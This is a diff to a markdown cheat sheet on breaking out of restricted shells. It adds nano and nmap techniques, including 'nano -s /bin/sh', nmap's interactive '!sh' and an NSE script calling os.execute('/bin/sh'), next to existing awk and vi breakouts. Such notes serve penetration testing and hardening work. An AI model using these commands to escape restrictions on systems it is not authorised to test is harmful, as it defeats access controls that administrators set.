@@ -32,8 +32,6 @@ Awk
 awk 'BEGIN {system("/bin/sh")}'
 ```
 
-
-
 Vi
 ---------
 From within vi it could be possible to breakout a restricted shell..
@@ -48,6 +46,14 @@ vi
 :shell
 ```
 
+nano
+---------
+```bash
+nano -s /bin/sh
+sh
+^T
+```
+
 Ed
 ---------
 ```bash
@@ -60,6 +66,16 @@ nmap
 It could be possible to breakout a restricted shell with an interactive nmap
 ```bash
 nmap -i
+```
+nmap < 5.35DC1
+```bash
+nmap --interactive
+!sh
+```
+nmap >= 5.35DC1
+```bash
+echo "os.execute('/bin/sh')" > shell.nse
+nmap --script=shell.nse
 ```
 
 Bypass rbash through SSH
